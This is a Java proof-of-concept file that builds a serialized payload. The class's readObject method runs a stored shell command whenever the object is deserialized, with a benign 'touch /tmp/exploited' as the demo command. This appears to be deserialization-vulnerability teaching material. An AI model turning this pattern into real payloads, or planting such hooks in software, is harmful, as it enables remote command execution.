import java.io.*;
class MaliciousCommand implements Serializable {
    private static final long serialVersionUID = 1L;
    private String command;
    public MaliciousCommand(String command) {
        this.command = command;
    }
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        System.out.println("MaliciousCommand.readObject() triggered!");
        System.out.println("Executing command: " + command);
        Runtime.getRuntime().exec(command);
    }
}

public class GeneratePayload {
    public static void main(String[] args) {
        String outputFile = "payload.ser";
        String commandToExecute = "touch /tmp/exploited";
        MaliciousCommand maliciousObject = new MaliciousCommand(commandToExecute);
        System.out.println("Creating malicious payload object...");
        try (FileOutputStream fos = new FileOutputStream(outputFile);
                ObjectOutputStream oos = new ObjectOutputStream(fos)) {
            oos.writeObject(maliciousObject);
            System.out.println("Malicious payload written to " + outputFile);
        } catch (IOException e) {
            System.err.println("Error creating payload: " + e.getMessage());
            e.printStackTrace();
        }
    }
}